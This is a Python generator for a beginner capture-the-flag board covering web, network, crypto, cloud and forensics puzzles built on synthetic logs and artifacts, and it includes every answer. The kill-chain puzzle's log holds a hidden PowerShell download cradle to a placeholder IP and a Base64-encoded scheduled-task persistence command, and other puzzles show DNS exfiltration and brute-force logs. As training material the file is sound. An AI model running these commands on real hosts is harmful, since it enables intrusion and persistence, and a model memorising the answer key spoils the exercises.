"""Generate data/ctf.json: the CyberHub challenge board. Every artifact is synthetic (reserved
example IPs and domains) and computed here, so answers always match. Run: python3 scripts/gen_ctf.py"""
import base64, hashlib, json
from pathlib import Path

def b64(s): return base64.b64encode(s.encode()).decode()
def b64u(s): return base64.urlsafe_b64encode(s.encode()).decode().rstrip('=')
def hx(s): return s.encode().hex()
def caesar(s, n): return ''.join(chr((ord(c) - (65 if c.isupper() else 97) + n) % 26 + (65 if c.isupper() else 97)) if c.isalpha() else c for c in s)
MORSE = {'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--', 'Z': '--..'}

C = []
def add(**k): C.append(k)

# ---------------- 100
add(id='view-source', title='View source', cat='Web', pts=100,
    prompt='The library\'s new homepage looks finished. The developer left something behind. Find the flag.',
    artifact='<!doctype html>\n<html lang="en">\n<head><title>Inland State Library</title></head>\n<body>\n  <!-- TODO remove before launch: ' + b64('CISO{view_source_first}') + ' -->\n  <h1>Welcome to the library</h1>\n  <p>Search the catalog below.</p>\n</body>\n</html>',
    hints=['HTML comments never show on the page, but anyone can read the source.', 'The string ends in "=": that is a Base64 hint. Try From Base64 in the Crypto & Encoding Lab.'],
    answer='CISO{view_source_first}', explain='Comments, hidden fields and old JavaScript ship to every visitor. Treat page source as public, because it is.')
add(id='headers', title='Header hunt', cat='Network', pts=100,
    prompt='A curl -I against the staging server returned these headers. One of them should not be there.',
    artifact='HTTP/1.1 200 OK\nServer: nginx/1.24.0\nContent-Type: text/html; charset=utf-8\nX-Powered-By: Express\nX-Debug-Token: ' + hx('CISO{headers_tell_stories}') + '\nCache-Control: no-store',
    hints=['Debug headers are for developers, not production.', 'Only 0-9 and a-f: decode it with From Hex.'],
    answer='CISO{headers_tell_stories}', explain='Headers leak versions, frameworks and debug data. Strip X-Powered-By and debug headers before production.')
add(id='subnet', title='Room for hosts', cat='Network', pts=100,
    prompt='The lab network is 10.4.0.0/22. How many usable host addresses does it have? Submit CISO{number}.',
    artifact='Network: 10.4.0.0/22',
    hints=['A /22 leaves 32 − 22 = 10 bits for hosts.', '2^10 addresses, minus the network and broadcast addresses.'],
    answer='CISO{1022}', explain='Usable hosts = 2^(32 − prefix) − 2. Subnetting questions show up on every networking exam and every firewall rule.')
add(id='morse', title='Dots and dashes', cat='Crypto', pts=100,
    prompt='Intercepted on an old radio channel. Words are separated by /. Submit the message in lower case with underscores between words, as CISO{...}.',
    artifact=' / '.join(' '.join(MORSE[c] for c in w) for w in 'SIGNALS ARE DATA'.split()),
    hints=['This is Morse code: short and long signals for each letter.', 'Look up a Morse chart. ... is S.'],
    answer='CISO{signals_are_data}', explain='Encoding is not secrecy. Morse, Base64 and hex are all just different ways of writing the same data.')
poem = ['Rain on the server room roof again', 'Every alert gets read before coffee', 'Alarms that cry wolf get tuned, not muted', 'Do the boring patching first', 'Tickets close when evidence says so',
        'Hunt for what the dashboards miss', 'Each log line is a witness', 'Every shift ends with good notes', 'Don\'t trust, verify', 'Gaps are where attackers live', 'Ever forward, never blame', 'Stay curious']
add(id='acrostic', title='Night shift poem', cat='Forensics', pts=100,
    prompt='The night-shift analyst left this poem on the whiteboard. Their manager says it is a message. Submit it as CISO{...} in lower case with underscores.',
    artifact='\n'.join(poem),
    hints=['Look at the edges of the poem, not the middle.', 'Read the first letter of each line, top to bottom. It splits into three words.'],
    answer='CISO{read_the_edges}', explain='An acrostic hides a message in plain sight. Steganography is the same idea with pixels and audio: the data is there if you know where to look.')
# ---------------- 200
add(id='phish-origin', title='Where did it really come from?', cat='Forensics', pts=200,
    prompt='A "payroll" email asked staff to update bank details. Which IP address actually sent it? Submit CISO{ip}.',
    artifact='Return-Path: <bounce@mailer.example.org>\nReceived: from mail.isu.example (mail.isu.example [192.0.2.25])\n\tby mx.isu.example with ESMTPS id 7Fq2; Tue, 21 Oct 2026 08:14:09 -0700\nReceived: from unknown (HELO desktop-7Q2) (203.0.113.45)\n\tby mail.isu.example with SMTP id 9Kd1; Tue, 21 Oct 2026 08:14:07 -0700\nAuthentication-Results: mx.isu.example; spf=fail smtp.mailfrom=mailer.example.org; dkim=none; dmarc=fail header.from=isu.example\nFrom: "Payroll" <payroll@isu.example>\nReply-To: payroll-update@isu-hr.example.net\nSubject: Action required: confirm your direct deposit',
    hints=['Each mail server adds a Received line on top. The oldest hop is at the bottom.', 'Find the bottom Received line and the IP in brackets after HELO.'],
    answer='CISO{203.0.113.45}', explain='From is easy to fake; Received chains, SPF and DMARC results are where the truth is. The Reply-To on a lookalike domain is the giveaway.')
auth = ['Oct 21 02:09:51 web02 sshd[811]: Failed password for admin from 198.51.100.9 port 50211 ssh2',
        'Oct 21 02:10:02 web02 sshd[811]: Failed password for root from 198.51.100.9 port 50215 ssh2',
        'Oct 21 02:11:40 web02 sshd[812]: Accepted publickey for mlopez from 10.0.5.23 port 51900 ssh2',
        'Oct 21 02:12:15 web02 sshd[813]: Failed password for webadmin from 198.51.100.9 port 50290 ssh2',
        'Oct 21 02:13:30 web02 sshd[813]: Failed password for webadmin from 198.51.100.9 port 50301 ssh2',
        'Oct 21 02:14:44 web02 sshd[814]: Failed password for test from 192.0.2.80 port 41000 ssh2',
        'Oct 21 02:15:02 web02 sshd[813]: Failed password for webadmin from 198.51.100.9 port 50318 ssh2',
        'Oct 21 02:16:12 web02 sshd[815]: Failed password for webadmin from 198.51.100.9 port 50330 ssh2',
        'Oct 21 02:17:26 web02 sshd[815]: Accepted password for webadmin from 198.51.100.9 port 50342 ssh2',
        'Oct 21 02:17:27 web02 systemd-logind[402]: New session 41 of user webadmin.',
        'Oct 21 02:19:03 web02 sudo:  webadmin : TTY=pts/2 ; PWD=/home/webadmin ; USER=root ; COMMAND=/usr/bin/crontab -e']
add(id='brute-window', title='Night-time login', cat='Forensics', pts=200,
    prompt='web02 was quiet overnight, or was it? Which account was broken into, and at what time (HHMM)? Submit CISO{user_HHMM}.',
    artifact='\n'.join(auth),
    hints=['Follow 198.51.100.9 from line to line.', 'Find the first "Accepted" for that IP after its failures. Use its minute, not the session line.'],
    answer='CISO{webadmin_0217}', explain='Failures then success from the same address is the brute-force pattern. The sudo crontab edit two minutes later is the attacker setting up persistence.')
acc = []
for ip, n in [('192.0.2.140', 6), ('198.51.100.12', 2), ('203.0.113.90', 5), ('10.0.5.44', 1), ('198.51.100.77', 3)]:
    for k in range(n): acc.append((ip, k))
order = sorted(acc, key=lambda x: (x[1], x[0]))
lines = []
for i, (ip, k) in enumerate(order):
    lines.append(f'{ip} - - [21/Oct/2026:03:{10 + i:02d}:0{k % 10}] "POST /wp-login.php HTTP/1.1" {200 if ip == "10.0.5.44" else 401} 512')
    if i % 4 == 1: lines.append(f'10.0.5.31 - - [21/Oct/2026:03:{10 + i:02d}:30] "GET /index.php HTTP/1.1" 200 8812')
add(id='wp-count', title='Who is knocking?', cat='Forensics', pts=200,
    prompt='How many different IP addresses sent MORE than 3 POST requests to /wp-login.php? Submit CISO{number}.',
    artifact='\n'.join(lines),
    hints=['Only count POST /wp-login.php lines.', 'Tally per IP. 3 exactly does not count: it must be more than 3.'],
    answer='CISO{2}', explain='Counting and thresholds are most of detection engineering. Write the rule, then check it against the boundary cases (exactly 3).')
fw = ['Oct 21 04:01:02 fw01 BLOCK TCP 203.0.113.5:40100 -> 192.0.2.10:23', 'Oct 21 04:02:13 fw01 BLOCK TCP 198.51.100.40:51000 -> 192.0.2.10:7311',
      'Oct 21 04:02:13 fw01 BLOCK TCP 203.0.113.5:40101 -> 192.0.2.10:3389', 'Oct 21 04:02:14 fw01 BLOCK TCP 198.51.100.40:51001 -> 192.0.2.10:8122',
      'Oct 21 04:02:15 fw01 BLOCK TCP 198.51.100.40:51002 -> 192.0.2.10:9033', 'Oct 21 04:02:16 fw01 RULE knockd: open 22 for 198.51.100.40',
      'Oct 21 04:02:17 fw01 ALLOW TCP 198.51.100.40:51003 -> 192.0.2.10:22', 'Oct 21 04:03:40 fw01 BLOCK TCP 203.0.113.5:40102 -> 192.0.2.10:22']
add(id='port-knock', title='Secret knock', cat='Network', pts=200,
    prompt='SSH on 192.0.2.10 is closed to everyone, yet one address got in. What sequence of ports opened the door? Submit CISO{port-port-port}.',
    artifact='\n'.join(fw),
    hints=['Follow only 198.51.100.40.', 'Its blocked ports, in order, right before the knockd line.'],
    answer='CISO{7311-8122-9033}', explain='Port knocking hides a service until a secret sequence arrives. It is obscurity, not authentication: anyone watching the traffic can replay it.')
add(id='caesar-unknown', title='Shifty', cat='Crypto', pts=200,
    prompt='Same flag format as always, but every letter was shifted by an amount nobody wrote down.',
    artifact=caesar('CISO{shift_happens}', 11),
    hints=['Every flag starts with C. What letter is here instead?', 'N is 11 letters after C. Use Caesar shift with -11.'],
    answer='CISO{shift_happens}', explain='Caesar has only 25 keys, and a known prefix gives the key away instantly. That is why real ciphers have enormous key spaces.')
# ---------------- 300
k = 0x33; xbytes = bytes(c ^ k for c in b'CISO{base64_then_xor_then_you}')
add(id='b64-xor', title='Wrapped twice', cat='Crypto', pts=300,
    prompt='Pulled from a malware config. It was XORed with one byte, then Base64-encoded. Unwrap it.',
    artifact=base64.b64encode(xbytes).decode(),
    hints=['Undo the outer layer first: From Base64, then To Hex so the XOR step can read it.', 'The first byte should be "C" (hex 43). First hex byte XOR 43 gives the key.', 'The key is 51.'],
    answer='CISO{base64_then_xor_then_you}', explain='Malware stacks cheap transforms to dodge string scanners. Known plaintext (the flag prefix, a URL, MZ in an executable) breaks them fast.')
cookie = b64u('{"user":"jchen","role":"student","exp":1793000000}')
add(id='cookie', title='Trust issues', cat='Web', pts=300,
    prompt='The course portal stores your session in this cookie, with no signature, and the server reads it as-is. Which field and value would turn you into an administrator? Submit CISO{field_value}.',
    artifact='Set-Cookie: session=' + cookie + '; Path=/; Secure\n\n// portal.js (served to every visitor)\nconst s = JSON.parse(atob(cookie.replace(/-/g, "+").replace(/_/g, "/")));\nif (s.role === "staff_admin") showGradebookEditor();',
    hints=['Decode the cookie value with From Base64URL.', 'Compare its role with the value the JavaScript checks for.'],
    answer='CISO{role_staff_admin}', explain='Anything the client holds, the client can change. Sessions must be signed (or kept server-side) and every permission checked on the server.')
labels = [hx('CISO{dns_'), hx('leaks_in_'), hx('pieces}')]
q = [f'02-{labels[1]}.s.exfil-cdn.example.org', f'03-{labels[2]}.s.exfil-cdn.example.org', f'01-{labels[0]}.s.exfil-cdn.example.org']
dns = ['10.0.5.52 -> 10.0.5.1  A     www.example.com', f'10.0.5.52 -> 10.0.5.1  TXT   {q[0]}', '10.0.5.23 -> 10.0.5.1  A     updates.example.com', f'10.0.5.52 -> 10.0.5.1  TXT   {q[1]}', f'10.0.5.52 -> 10.0.5.1  TXT   {q[2]}', '10.0.5.31 -> 10.0.5.1  AAAA  portal.csusb.example.edu']
add(id='dns-pieces', title='Piece by piece', cat='Network', pts=300,
    prompt='A host is smuggling data out in DNS queries, out of order. Put it back together.',
    artifact='\n'.join(dns),
    hints=['Only the TXT queries to exfil-cdn.example.org matter.', 'Each label starts with a sequence number. Sort by it, join the hex after the dash, then From Hex.'],
    answer='CISO{dns_leaks_in_pieces}', explain='DNS tunnels chunk data across queries. Reassembly is how you prove what left the network, and long random-looking labels to one domain are how you spot it.')
files = {'setup-2.4.1-a.zip': 'PK..CyberHub installer build a', 'setup-2.4.1-b.zip': 'PK..CyberHub installer build b', 'setup-2.4.1-c.zip': 'PK..CyberHub installer build c', 'setup-2.4.1-d.zip': 'PK..CyberHub installer build d'}
pub = hashlib.sha256(files['setup-2.4.1-c.zip'].encode()).hexdigest()
add(id='hash-match', title='Which download is real?', cat='Crypto', pts=300,
    prompt='Four mirrors serve "setup-2.4.1.zip". The vendor publishes one SHA-256. Each file\'s contents are shown as text. Which file is genuine? Submit CISO{file name}.',
    artifact='Vendor-published SHA-256: ' + pub + '\n\n' + '\n'.join(f'{n}: "{c}"' for n, c in files.items()),
    hints=['Paste each file\'s quoted contents (without the quotes) into the Crypto & Encoding Lab input.', 'Press "SHA-256 the input" and compare with the published hash.'],
    answer='CISO{setup-2.4.1-c.zip}', explain='Verifying a hash from a separate, trusted channel is how you know a download was not swapped. A hash next to the file on the same mirror proves nothing.')
# ---------------- 400
add(id='iam-deny', title='Who wins?', cat='Cloud', pts=400,
    prompt='The reporting role has the policy below. Can it delete objects in reports-prod? Submit CISO{allow or deny_Sid of the deciding statement}, for example CISO{allow_ReadAll}.',
    artifact=json.dumps({'Version': '2012-10-17', 'Statement': [
        {'Sid': 'ReadAll', 'Effect': 'Allow', 'Action': ['s3:GetObject', 's3:ListBucket'], 'Resource': ['arn:aws:s3:::reports-*', 'arn:aws:s3:::reports-*/*']},
        {'Sid': 'ManageReports', 'Effect': 'Allow', 'Action': 's3:*', 'Resource': 'arn:aws:s3:::reports-*/*'},
        {'Sid': 'BlockProdDeletes', 'Effect': 'Deny', 'Action': ['s3:DeleteObject', 's3:DeleteObjectVersion'], 'Resource': 'arn:aws:s3:::reports-prod/*'}]}, indent=2),
    hints=['ManageReports allows s3:* on every reports bucket, including prod.', 'In AWS, an explicit Deny always beats any Allow.'],
    answer='CISO{deny_BlockProdDeletes}', explain='Policy evaluation: explicit Deny > explicit Allow > implicit deny. Guardrails like this survive someone later attaching a broad Allow.')
# ---------------- 500
enc = b64('schtasks /create /tn "OneDriveUpdateCheck" /tr "C:\\Users\\Public\\odu.exe" /sc hourly')
kc = ['== mail gateway ==', '09:02:11 delivered  to=jchen@isu.example  from=billing@invoices-isu.example.net  attachment=Invoice_Oct.docm  verdict=clean',
      '', '== proxy ==', '09:05:40 10.0.5.31 GET http://198.51.100.7/s.txt 200 text/plain 412 bytes', '09:05:41 10.0.5.31 GET https://www.example.com/ 200',
      '', '== endpoint process log (10.0.5.31) ==', '09:05:02 explorer.exe -> WINWORD.EXE "C:\\Users\\jchen\\Downloads\\Invoice_Oct.docm"',
      '09:05:38 WINWORD.EXE -> powershell.exe -nop -w hidden -c "iwr http://198.51.100.7/s.txt"',
      f'09:05:43 powershell.exe -> powershell.exe -nop -enc {enc}', '09:05:44 powershell.exe -> schtasks.exe (see parent command line)', '09:20:00 svchost.exe -> odu.exe']
add(id='kill-chain', title='Kill chain', cat='Forensics', pts=500,
    prompt='Three log sources, one incident. The attacker set up something to survive a reboot. What is it called? Submit CISO{name}.',
    artifact='\n'.join(kc),
    hints=['Start at the email, then follow WINWORD.EXE in the process log.', 'The -enc argument is Base64 (real PowerShell uses UTF-16LE; this one is plain UTF-8). Decode it.', 'schtasks /tn sets the scheduled task name.'],
    answer='CISO{OneDriveUpdateCheck}', explain='Phishing email, macro, download cradle, encoded command, scheduled task: the full chain. Each step had a chance to stop it: attachment policy, macro blocking, egress filtering, script logging, and alerting on new scheduled tasks.')

def norm(s):
    s = ''.join(s.split()).lower()
    if s.startswith('ciso{') and s.endswith('}'): s = s[5:-1]
    return s
for c in C: c['hash'] = hashlib.sha256(norm(c['answer']).encode()).hexdigest()
out = {'note': 'Generated by scripts/gen_ctf.py. Answers are synthetic training flags; the site ships only their hashes.', 'challenges': C}
Path(__file__).resolve().parent.parent.joinpath('data/ctf.json').write_text(json.dumps(out, indent=1, ensure_ascii=False) + '\n')
print(len(C), 'challenges,', sum(c['pts'] for c in C), 'points')
